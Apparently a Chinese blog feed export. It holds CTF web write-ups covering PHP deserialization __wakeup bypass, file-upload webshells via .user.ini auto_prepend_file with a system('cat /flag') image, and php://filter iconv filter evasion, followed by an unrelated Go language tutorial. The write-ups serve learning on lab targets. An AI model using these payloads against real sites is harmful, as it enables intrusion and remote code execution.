<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">document.write(<span class="regexp">s[o%4][0]</span>);s[o%4].splice(<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line"><span class="regexp">//</span>输出fl;随后删除fl</span><br><span class="line">/*</span><br><span class="line">代码运行详解：</span><br><span class="line">第一步：document.write(<span class="regexp">s[0][0]</span>);s[<span class="number">0</span>].splice(<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">第二步：document.write(t[<span class="number">0</span>]);t.splice(<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">第三步：document.write(<span class="string">&quot;fl&quot;</span>);删除t[<span class="string">&quot;fl&quot;</span>,<span class="string">&quot;s_a&quot;</span>,<span class="string">&quot;i&quot;</span>,<span class="string">&quot;e&#125;&quot;</span>]中第一个位置，一个项目，即删除fl</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>

<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">document.write的功能可以看一下这篇文章https:<span class="regexp">//</span>blog.csdn.net<span class="regexp">/qq_34986769/</span>article<span class="regexp">/details/</span><span class="number">52160532</span></span><br></pre></td></tr></table></figure>

<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">splice</span><span class="params">()</span></span> 方法向/从数组中添加/删除项目，然后返回被删除的项目。</span><br><span class="line">注释：该方法会改变原始数组。</span><br><span class="line">语法</span><br><span class="line">arrayObject<span class="selector-class">.splice</span>(index,howmany,item1,.....,itemX)</span><br><span class="line">参数	                         描述</span><br><span class="line">index	                     必需。整数，规定添加/删除项目的位置，使用负数可从数组结尾处规定位置。</span><br><span class="line">howmany	                     必需。要删除的项目数量。如果设置为 <span class="number">0</span>，则不会删除项目。</span><br><span class="line">item1, ..., itemX	         可选。向数组添加的新项目。</span><br></pre></td></tr></table></figure>

<h2 id="13-unserialize3"><a href="#13-unserialize3" class="headerlink" title="13.unserialize3"></a>13.unserialize3</h2><h3 id="1-题目描述-22"><a href="#1-题目描述-22" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2）wp-7"><a href="#2）wp-7" class="headerlink" title="2）wp"></a>2）wp</h3><p>这道题需要了解<a href="../../../../2022/05/28/Web-study">php反序列化</a>中__wakeup漏洞的利用,还有<a href="../../../../2022/05/28/Web-study">php魔术方法</a></p>
<p><code>__wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。</code></p>
<p>开始的代码不完整，是一段残缺的PHP代码，根据题目名字知道这是给反序列化的题目，?code&#x3D;可能是提醒需要在url利用以GET方式提交code值</p>
<p><img src="https://img-blog.csdnimg.cn/669297deb27d4dce9bbdac477d78c6b7.png" alt="在这里插入图片描述"></p>
<p>下方是把代码补充完善后，并并调用序列化函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;                        <span class="comment">//定义一个名为xctf的类</span></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;       <span class="comment">//定义一个公有的类属性$flag，值为111</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;                                </span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line"><span class="comment">//定义一个公有的类方法__wakeup()，输出bad requests后退出当前脚本</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">xctf</span>();    </span><br><span class="line"><span class="comment">//使用new运算符来实例化该类（xctf）的对象为</span></span><br><span class="line"><span class="comment">//这里也就是定义了了一个新的类用来反序列化</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));       </span><br><span class="line"><span class="comment">//serialize()序列化函数</span></span><br><span class="line"><span class="comment">//输出被序列化的对象</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行该php代码，得到序列化后的字符串</p>
<p><code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220627215806623.png" alt="image-20220627215806623"></p>
<p>如果看不懂，可以看看方便下图理解</p>
<p><img src="https://img-blog.csdnimg.cn/740796b022bc4fb3a141a1f116467daf.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aSn54Gs55m9,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<p>这里如果直接访问，会失败</p>
<p><code>http://111.200.241.244:54024/?code=O:4:%22xctf%22:1:&#123;s:4:%22flag%22;s:3:%22111%22;&#125;</code></p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220627220136916.png" alt="image-20220627220136916"></p>
<p>因为我们忽略了<code>__wakeup()</code>，这里就需要了解php的魔术方法当中的绕过__wakeup()</p>
<p><code>如何绕过__wakeup()：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。从而绕过了__wakeup()函数</code></p>
<p>在这串序列化的代码中，对象属性数为1，把下列的1改为2(&gt;1)，即可</p>
<p><code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p>
<p>–&gt;</p>
<p><code>O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p>
<hr>
<p>这里我插入一个新学到的payload</p>
<p><code>C:4:&quot;xctf&quot;:0:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p>
<p>发现也是可以的，也是可以绕过<code>__wakeup()</code>函数</p>
<p>C代表这个类实现了serializeable接口，serializeable不支持wakeup，就绕过去了</p>
<hr>
<p>然后payload:</p>
<p><code>http://111.200.241.244:54024/?code=O:4:%22xctf%22:2:&#123;s:4:%22flag%22;s:3:%22111%22;&#125;</code></p>
<p>得到flag</p>
<p>补充：</p>
<figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line">php实例化：是指在面向对象的编程中，把用类创建对象的过程称为实例化，是将一个抽象的概念类，具体到该类实物的过程，实例化过程中一般由【类名 对象名 = <span class="keyword">new</span> 类名（参数<span class="number">1</span>，参数<span class="number">2.</span>..参数n）】构成。</span><br><span class="line"></span><br><span class="line">php类对象是什么意思？</span><br><span class="line">类 − 定义了一件事物的抽象特点。类的定义包含了数据的形式以及对数据的操作。</span><br><span class="line">对象 − 是类的实例。</span><br><span class="line">在面向对象的程序设计（英语：<span class="built_in">Object</span>-oriented programming，缩写：OOP）中，对象是一个由信息及对信息进行处理的描述所组成的整体，是对现实世界的抽象。在现实世界里我们所面对的事情都是对象，如计算机、电视机、自行车等。</span><br></pre></td></tr></table></figure>

<h2 id="14-upload1"><a href="#14-upload1" class="headerlink" title="14.upload1"></a>14.upload1</h2><h3 id="1-题目描述-23"><a href="#1-题目描述-23" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-16"><a href="#2-wp-16" class="headerlink" title="2)wp"></a>2)wp</h3><p>典型的文件上传漏洞，可以先把upload-labs线下靶场学习一下</p>
<p>先直接上传php文件，发现被拦截</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220704104557362.png" alt="image-20220704104557362"></p>
<p>于是构造一个图片木马上传，然后burp修改后缀，看看是不是前端验证</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220704104752019.png" alt="image-20220704104752019"></p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220704104814064.png" alt="image-20220704104814064"></p>
<p>发现上传成功</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220704104830480.png" alt="image-20220704104830480"></p>
<p>用蚁剑试着连一下</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220704105115729.png" alt="image-20220704105115729"></p>
<p>发现连接成功，打开看看，在html下发现flag.php</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220704105139801.png" alt="image-20220704105139801"></p>
<p>打开文件</p>
<p>得到flag</p>
<hr>
<p>后面的题难度飞升，水平有限，后面的题仅写一些个人笔记，建议认真阅读其他大佬的wp，遇到难点，建议先巩固概念基础</p>
<h2 id="15-easytornado"><a href="#15-easytornado" class="headerlink" title="15.easytornado"></a>15.easytornado</h2><p>一道tornado框架题，属于ssti注入，建议先看一些文章</p>
<p>了解了再尝试完成</p>
<h1 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h1><h2 id="1-easyupload"><a href="#1-easyupload" class="headerlink" title="1.easyupload"></a>1.easyupload</h2><h3 id="1-题目描述-24"><a href="#1-题目描述-24" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>一名合格的黑客眼中，所有的上传点都是开发者留下的后门</p>
<h3 id="2-wp-17"><a href="#2-wp-17" class="headerlink" title="2)wp"></a>2)wp</h3><p><u><em>这道题写的1星，但是过滤又多，还涉及了上传.user.ini文件，学到了,下面是大佬的wp</em></u></p>
<p>本题需要利用文件上传漏洞点，通过绕过服务器的安全防护，达到getshell的目的</p>
<p>本题的主要考点为利用fastcgi的.user.ini特性进行任意命令执行</p>
<p>这里需要绕过的点如下</p>
<ul>
<li>检查文件内容是否有php字符串</li>
<li>检查后缀中是否有htaccess或ph</li>
<li>检查文件头部信息</li>
<li>文件MIME类型</li>
</ul>
<p>对于第一点可以利用短标签绕过，例如 <?=phpinfo();?></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">把short_open_tag 字段改为On，就可以实现短标签功能</span><br><span class="line"></span><br><span class="line">短标签：</span><br><span class="line"><span class="number">1</span>.能正常解析类似于这样形式的php文件： <span class="title function_ invoke__">phpinfo</span>() <span class="meta">?&gt;</span>  </span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.使用<span class="meta">&lt;?=</span><span class="variable">$a</span><span class="meta">?&gt;</span>的形式输出，在短标签看来，<span class="meta">&lt;?=</span><span class="variable">$a</span><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>.<span class="meta">&lt;?=</span>(表达式)<span class="meta">?&gt;</span></span><br><span class="line">就相当于</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$a</span><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> (表达式)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">正确：</span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27; phpinfo();?&gt;&lt;? echo $a ?&gt;&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">报错：</span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;&lt;? phpinfo();?&gt;&lt;?=$a ?&gt;&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">从这个对比试验我们可以看出：</span><br><span class="line">在短标签模式下，</span><br><span class="line">我们执行php语句php函数，都用类似于这样形式的php文件：</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br><span class="line">但是我们要输出一个flag，或者变量时，使用<span class="meta">&lt;?=</span><span class="variable">$a</span><span class="meta">?&gt;</span>的形式输出</span><br></pre></td></tr></table></figure>

<p>对于第二点可以通过上传.user.ini以及正常jpg文件来进行getshell,可以参考以下文章</p>
<p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">文章</a></p>
<p>在服务器中，只要是运用了fastcgi的服务器就能够利用该方式getshell，不论是apache或者ngnix或是其他服务器。</p>
<p> 这个文件是php.ini的补充文件，当网页访问的时候就会自动查看当前目录下是否有.user.ini，然后将其补充进php.ini，并作为cgi的启动项。</p>
<p> 其中很多功能设置了只能php.ini配置，但是还是有一些危险的功能可以被我们控制，比如auto_prepend_file。</p>
<p>第三点绕过方式即在文件头部添加一个图片的文件头，比如<code>GIF89a</code></p>
<p>第四点绕过方法即修改上传时的Content-Type</p>
<p>因此最终的payload为：<br> 上传.user.ini，内容为</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">GIF89a                  </span><br><span class="line"><span class="attribute">auto_prepend_file</span>=a.jpg</span><br></pre></td></tr></table></figure>

<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">auto</span>_append_file、<span class="built_in">auto</span>_prepend_file:指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而<span class="built_in">auto</span>_append_file类似，只是在文件后面包含。 </span><br><span class="line"></span><br><span class="line">使用方法很简单，直接写在.user.ini中：</span><br></pre></td></tr></table></figure>

<p>上传a.jpg，内容为</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?</span>=<span class="keyword">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="2-file-include【江苏工匠杯】"><a href="#2-file-include【江苏工匠杯】" class="headerlink" title="2.file_include【江苏工匠杯】"></a>2.file_include【江苏工匠杯】</h2><h3 id="1-题目描述-25"><a href="#1-题目描述-25" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>怎么读取文件呢？</p>
<h3 id="2-wp-18"><a href="#2-wp-18" class="headerlink" title="2)wp"></a>2)wp</h3><p>这是一道文件包含的题目</p>
<p>但是开始一直用伪协议读取都失败</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">61.147</span>.<span class="number">171.105</span>:<span class="number">61462</span><span class="regexp">/?filename=php:/</span><span class="regexp">/filter/</span>read=convert.base64/resource=flag.php</span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/21/Gongfang-wp/image-20230104221540491.png" alt="image-20230104221540491"></p>
<p>根据源码猜测，是在<code>check.php</code>中设置了过滤，但是直接访问是无法得到文件内容的</p>
<p>这里涉及到一个知识点</p>
<h4 id="Conversion-Filters（转换过滤器）"><a href="#Conversion-Filters（转换过滤器）" class="headerlink" title="Conversion Filters（转换过滤器）"></a>Conversion Filters（转换过滤器）</h4><p><code>Conversion Filters</code>（转换过滤器）如同 <code>string.</code> 过滤器，<code>convert.</code> 过滤器的作用就和其名字一样。转换过滤器是 <code>PHP 5.0.0</code> 添加的。</p>
<p>常用的<code>convert.base64</code>就是其应用</p>
<p>但是我们这里测试可以知道</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20230104222154684.png" alt="image-20230104222154684"></p>
<p>这里将<code>base64</code>过滤了，也就是不能进行<code>base64</code>转化，<code>read</code>也不能用</p>
<p>于是这里就提及了</p>
<h5 id="convert-iconv"><a href="#convert-iconv" class="headerlink" title="convert.iconv.*"></a>convert.iconv.*</h5><p>这个过滤器需要 php 支持 iconv，而 iconv 是默认编译的。使用convert.iconv.*过滤器等同于用<code>iconv()</code>函数处理所有的流数据。</p>
<p>使用方法</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">convert.iconv.&lt;<span class="keyword">input</span>-<span class="keyword">encoding</span>&gt;.&lt;output-<span class="keyword">encoding</span>&gt; </span><br><span class="line"><span class="keyword">or</span> </span><br><span class="line">convert.iconv.&lt;<span class="keyword">input</span>-<span class="keyword">encoding</span>&gt;/&lt;output-<span class="keyword">encoding</span>&gt;</span><br></pre></td></tr></table></figure>

<p>相比单纯的<code>convert.</code>加上<code>.iconv</code>后，可以将数据进行转化后，再进行转化输出</p>
<p>而其能进行加码的方式有</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">UCS</span>-<span class="number">4</span>*</span><br><span class="line"><span class="attribute">UCS</span>-<span class="number">4</span>BE</span><br><span class="line"><span class="attribute">UCS</span>-<span class="number">4</span>LE*</span><br><span class="line"><span class="attribute">UCS</span>-<span class="number">2</span></span><br><span class="line"><span class="attribute">UCS</span>-<span class="number">2</span>BE</span><br><span class="line"><span class="attribute">UCS</span>-<span class="number">2</span>LE</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">32</span>*</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">32</span>BE*</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">32</span>LE*</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">16</span>*</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">16</span>BE*</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">16</span>LE*</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">7</span></span><br><span class="line"><span class="attribute">UTF7</span>-IMAP</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">8</span>*</span><br><span class="line"><span class="attribute">ASCII</span>*</span><br></pre></td></tr></table></figure>



<p>但是这些加码方式也有些被过滤</p>
<p>进行爆破得到<code>UTF-7，UCS-4*</code>可以</p>
<p>直接构造</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">61.147</span>.<span class="number">171.105</span>:<span class="number">61462</span><span class="regexp">/?filename=php:/</span><span class="regexp">/filter/</span>convert.iconv.UTF-<span class="number">7</span>.UCS-<span class="number">4</span>*/resource=flag.php</span><br></pre></td></tr></table></figure>

<p>得到<code>flag</code></p>
<p><img src="/2022/06/21/Gongfang-wp/image-20230104223717245.png" alt="image-20230104223717245"></p>
<hr>
<p>查看一下<code>check.php</code>内容</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20230104223436793.png" alt="image-20230104223436793"></p>
<p>发现过滤了</p>
<figure class="highlight coq"><table><tr><td class="code"><pre><span class="line">base|<span class="type">be</span>|<span class="type">encode</span>|<span class="type">print</span>|<span class="type">zlib</span>|<span class="type">quoted</span>|<span class="type">write</span>|<span class="type">rot13</span>|<span class="type">read</span>|<span class="type">string</span></span><br><span class="line"></span><br><span class="line">看到这里过滤了quoted，string，所以这里的转化过滤器函数用的iconv()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
      <tags>
        <tag>线上靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>golang</title>
    <url>/2022/12/23/Go/</url>
    <content><![CDATA[<p><strong><code>go语言真好玩(</code></strong></p>
<p><code>主要从黄哥的资料笔记，尚硅谷，以及谢先斌大佬的笔记</code><strong><code>https://www.xiexianbin.cn/golang</code></strong></p>
<p><code>以及</code><strong><a href="https://exercism.org/">https://exercism.org/</a></strong><code>上面进行练习</code></p>
<span id="more"></span>

<h1 id="Day1"><a href="#Day1" class="headerlink" title="Day1"></a>Day1</h1><h2 id="GO语言概述"><a href="#GO语言概述" class="headerlink" title="GO语言概述"></a>GO语言概述</h2><blockquote>
<p>Go语言是谷歌2009年发布的第二款开源编程语言,它专门针对多处理器系统应用程序的编程进行了优化，它是一种系统语言其非常有用和强大,其程序可以媲美C或C++代码的速度，而且更加安全、支持并行进程。</p>
<p>Go支持面向对象，而且具有真正的闭包(closures)和反射 (reflection)等功能。</p>
<p>Go可以在不损失应用程序性能的情况下降低代码的复杂性。</p>
<p>Go是是静态强类型语言</p>
<p>Go语言开发者被叫做gopher，这个和信息查找系统gopher协议同名</p>
</blockquote>
<h2 id="Go语言特色"><a href="#Go语言特色" class="headerlink" title="Go语言特色"></a>Go语言特色</h2><blockquote>
<ul>
<li>简洁、快速、安全</li>
<li>并行、有趣、开源</li>
<li>内存管理、数组安全、编译迅速</li>
</ul>
</blockquote>
<h2 id="Go语言用途"><a href="#Go语言用途" class="headerlink" title="Go语言用途"></a>Go语言用途</h2><blockquote>
<p>Go 语言被设计成一门应用于搭载 Web 服务器，存储集群或类似用途的巨型中央服务器的系统编程<br>语言。对于高性能分布式系统领域而言，Go 语言无疑比大多数其它语言有着更高的开发效率。<br>它提供了海量并行的支持，这对于游戏服务端的开发而言是再好不过了。</p>
</blockquote>
<h2 id="Go语言编译过程"><a href="#Go语言编译过程" class="headerlink" title="Go语言编译过程"></a>Go语言编译过程</h2><p><img src="/2022/12/23/Go/image-20230117215732032.png" alt="image-20230117215732032"></p>
<h2 id="可查看文档网站信息"><a href="#可查看文档网站信息" class="headerlink" title="可查看文档网站信息"></a>可查看文档网站信息</h2><blockquote>
<p>官网:<br><a href="https://golang.google.cn/">https://golang.google.cn/</a><br>API文档:<br><a href="https://golang.google.cn/doc/">https://golang.google.cn/doc/</a><br>教程:<br><a href="http://www.w3cschool.cn/go/go-tutorial.html">http://www.w3cschool.cn/go/go-tutorial.html</a><br>下载:<br><a href="https://golang.google.cn/dl/">https://golang.google.cn/dl/</a></p>
</blockquote>
<h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><p>基础概念将介绍三种主要的语言特性：<code>包、函数和变量</code></p>
<h3 id="Package"><a href="#Package" class="headerlink" title="Package"></a>Package</h3><blockquote>
<p><code>Go</code> 应用程序以包的形式组织。包是位于同一目录中的源文件的集合。目录中的所有源文件必须共享相同的包名称。包名称通常是导入路径中的最后一个目录。</p>
</blockquote>
<p>例如，</p>
<p><a href="https://golang.org/src/math/rand/">“math&#x2F;rand”包</a>中的文件以语句开头<code>package rand</code>。</p>
<blockquote>
<p>导入包时，只能使用&#x2F;访问名称以大写字母开头的实体（函数、类型、变量、常量）。Go 中推荐的命名风格是标识符将使用 命名<code>camelCase</code>，除了那些意味着可以跨包访问的标识符应该是<code>PascalCase</code></p>
</blockquote>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> lasagna</span><br></pre></td></tr></table></figure>

<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>Go 是静态类型的，这意味着所有变量在编译时都<a href="https://en.wikipedia.org/wiki/Type_system">必须具有定义的类型。</a></p>
<p>可以通过显式指定类型来定义变量：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> explicit <span class="type">int</span> <span class="comment">// 显式声明</span></span><br></pre></td></tr></table></figure>

<p>您还可以使用初始化器，编译器将分配变量类型以匹配初始化器的类型。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">implicit := <span class="number">10</span>   <span class="comment">// 隐式声明为int，自动分配类型</span></span><br><span class="line"><span class="comment">//也就是说可以利用 := 进行类型声明，其类型为其后数据的类型</span></span><br></pre></td></tr></table></figure>

<p>声明后，可以使用运算符为变量赋值<code>=</code>。一旦声明，变量的类型就永远不会改变。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">count := <span class="number">1</span> <span class="comment">// 赋初值</span></span><br><span class="line">count = <span class="number">2</span>  <span class="comment">// 更新新值</span></span><br><span class="line"></span><br><span class="line">count = <span class="literal">false</span> <span class="comment">// 由于分配了非“int”类型，这会引发编译器错误</span></span><br></pre></td></tr></table></figure>

<h3 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h3><p>常量就像变量一样保存一段数据，但它们的值在程序执行过程中不能改变。</p>
<p>常量使用<code>const</code>关键字定义，可以是数字、字符、字符串或布尔值：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> Age = <span class="number">21</span> <span class="comment">// 定义一个值为 21 的数值常量 &#x27;Age&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p><code>Go</code> 函数接受<code>零个或多个参数</code>。<strong>参数必须明确类型化，没有隐式声明类型。</strong></p>
<p><code>return</code>使用关键字从函数返回值。</p>
<p>通过指定函数名称并为函数的每个参数传递参数来调用函数。</p>
<blockquote>
<p>请注意，Go 支持两种类型的注释：</p>
<p>单行注释在前面，多行注释在和<code>//</code>之间插入。<code>/*``*/</code></p>
</blockquote>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> greeting</span><br><span class="line"></span><br><span class="line"><span class="comment">// Hello is a public function.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Hello</span> <span class="params">(name <span class="type">string</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> hi(name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// hi is a private function.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hi</span> <span class="params">(name <span class="type">string</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hi &quot;</span> + name</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="函数定义"><a href="#函数定义" class="headerlink" title="*函数定义"></a>*函数定义</h4><blockquote>
<p><code>func 函数名(形参列表) 返回类型列表 &#123;</code><br>  <code>函数体</code><br><code>&#125;</code></p>
<p>这里的返回类型列表是因为<code>返回值需要描述返回值类型</code></p>
</blockquote>
<h4 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h4><blockquote>
<p>函数可以通过 <code>函数名(实参列表)</code>，在调用过程中实参的每个数据会赋值给形参中的对应变量（实参列表类型和数量需要与形参一一对应）</p>
<p>【这和大部分代码的调用函数方法一样，不用多说】</p>
</blockquote>
<h4 id="基础函数示例"><a href="#基础函数示例" class="headerlink" title="*基础函数示例"></a>*基础函数示例</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 无参函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hello</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;Hello World!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 有参函数，name 称为形参</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">helloSomeone</span><span class="params">(name <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;Hello&quot;</span>, name, <span class="string">&quot;!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 有返回值函数</span></span><br><span class="line"><span class="comment">//func add(a int, b int) int &#123;</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">add</span><span class="params">(a, b <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line"><span class="comment">//函数声明中[a,b]存在多个相同类型[int]的连续形参，可以只保留最后一个形参的类型[a, b int]</span></span><br><span class="line">	<span class="keyword">return</span> a + b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ExampleFunc</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 无参函数调用</span></span><br><span class="line">	hello()</span><br><span class="line">	<span class="comment">// 函数的标识符为 func()，调用函数需要加 ()</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;%T\n&quot;</span>, hello)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 有参函数调用</span></span><br><span class="line">	helloSomeone(<span class="string">&quot;xianbin&quot;</span>) <span class="comment">// name = &quot;xianbin&quot; 为实参，调用函数时，传递给函数的形参</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;%T\n&quot;</span>, helloSomeone)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 有返回值函数调用</span></span><br><span class="line">	sum := add(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">	fmt.Println(sum)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%T\n&quot;</span>, add)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 函数的类型</span></span><br><span class="line">	<span class="keyword">var</span> f <span class="function"><span class="keyword">func</span><span class="params">(<span class="type">int</span>, <span class="type">int</span>)</span></span> <span class="type">int</span></span><br><span class="line">    <span class="comment">//函数[func(int, int) int]也可以赋值给变量[var f]，也可以当成实参[f(1, 2)]赋值给另一个函数[fmt.Println()]作为形参。</span></span><br><span class="line">	f = add</span><br><span class="line">	fmt.Println(f(<span class="number">1</span>, <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Output:</span></span><br><span class="line">	<span class="comment">//Hello World!</span></span><br><span class="line">	<span class="comment">//func()</span></span><br><span class="line">	<span class="comment">//Hello xianbin !</span></span><br><span class="line">	<span class="comment">//func(string)</span></span><br><span class="line">	<span class="comment">//3</span></span><br><span class="line">	<span class="comment">//func(int, int) int</span></span><br><span class="line">	<span class="comment">//3</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Day2"><a href="#Day2" class="headerlink" title="Day2"></a>Day2</h1><h2 id="数字"><a href="#数字" class="headerlink" title="数字"></a>数字</h2><p>Go 包含基本的数字类型，可以表示整数或浮点值的集合。</p>
<p>这个概念将集中在两种数字类型上：</p>
<blockquote>
<ul>
